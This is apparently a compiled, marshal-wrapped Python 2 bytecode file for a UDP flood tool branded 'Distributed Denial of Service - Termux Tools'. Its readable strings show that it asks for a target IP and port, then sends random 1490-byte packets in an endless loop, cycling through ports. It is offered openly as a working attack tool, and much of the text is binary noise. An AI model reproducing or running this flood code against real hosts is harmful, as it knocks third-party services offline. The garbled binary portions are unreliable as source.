�
b�t_c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Ns�  c           @   s<  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z e j �  Z e j Z e j Z e j	 Z	 e j
 Z
 e j Z e j e j e j
 � Z e j d � Z e j d � d GHd GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHd
 GHd GHe d � Z e d � Z e j d � d GHe j d � e j d � d GHe j d � e j d � d GHe j d � e j d � d GHe j d � e j d � d GHe j d � e j d � d GHe j d � e j d � d Z x[ e r7e j e e e f � e d Z e d Z d e e e f GHe d k r�d Z q�q�Wd S(   i����N(   t   datetimei�  t   clears�  [1;31m
Refined by Alexander Kane Earnest
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M       YMM M       YMM MMP     YMM MP       MM
M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
M        MM M        MM MMb     dMM Mb       dM
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMs@   [41m[1;37m  Distributed Denial of Service - Termux Tools  [0mt    s%   [1;33mAuthor   : [1;37Alexander Kane Earnest s8   [1;33mGithub   : [1;37mhttps://github.com/VRCHS s=   [1;33mSource   : [1;37mhttps://github.com/VRCHS/DDoS-Panel s#   [1;32mPress CTRL+C to stop sendings   [1;37m------------ [0ms   [1;37mINPUT TARGET [0ms$   [37m[*] [91mIP or HOSTNAME :[32m s$   [37m[*] [91mPORT SCANNING  :[32m s    Run DDOS Attack.i   s    Preparing DDoS Attack..s    Run DDOS Attack...i    s%   Sent %s packet to %s throught port:%si��  (   t   syst   ost   timet   sockett   randomR    t   nowt   hourt   minutet   dayt   montht   yeart   AF_INETt
   SOCK_DGRAMt   sockt   _urandomt   bytest   systemt	   raw_inputt   ipt   inputt   portt   sleept   sentt   Truet   sendto(    (    (    t    t   <module>   sn   					
	












	

(   t   marshalt   loads(    (    (    s   ddos_.pyt   <module>   s   